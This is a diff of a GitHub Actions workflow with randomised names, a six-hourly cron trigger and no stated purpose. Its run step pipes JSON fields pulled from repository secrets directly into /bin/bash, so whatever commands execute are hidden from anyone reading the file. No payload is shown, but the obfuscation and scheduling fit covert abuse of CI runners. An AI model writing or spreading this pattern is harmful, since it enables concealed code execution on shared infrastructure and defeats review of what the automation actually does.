@@ -1,25 +1,24 @@
 name: piqijing4567
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
-jobs:  # 28343
+    - cron: '25 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: piqijing4567
         env:
-          har9304: ${{ secrets.har9304 }}
+          es59495: ${{ secrets.es59495 }}
         run: |
-          echo $har9304 | jq -r .kjuzb92 | /bin/bash
-          echo $q53 | jq -r .g76762 | /bin/bash
-          echo $tvq375 | jq -r .lnfe6 | /bin/bash
-          echo $emejh3933 | jq -r .qm6045 | /bin/bash
-          echo $zdkl0702 | jq -r .uo95 | /bin/bash
-          echo $vel5128 | jq -r .quo3118 | /bin/bash
-          echo $m6 | jq -r .kkpcd07 | /bin/bash
-          echo $w1772 | jq -r .pp99 | /bin/bash
-          echo $rqu05 | jq -r .ixswt0011 | /bin/bash
+          echo $es59495 | jq -r .y0 | /bin/bash
+          echo $nqcr0649 | jq -r .iysfz964 | /bin/bash
+          echo $uvez09 | jq -r .wsee37116 | /bin/bash
+          echo $xzxq330 | jq -r .cc9493 | /bin/bash
+          echo $rnof64 | jq -r .ysae7065 | /bin/bash
+          echo $zdou0 | jq -r .op184 | /bin/bash
+          echo $p28 | jq -r .c1 | /bin/bash
+          echo $mz26 | jq -r .sogl90 | /bin/bash
 
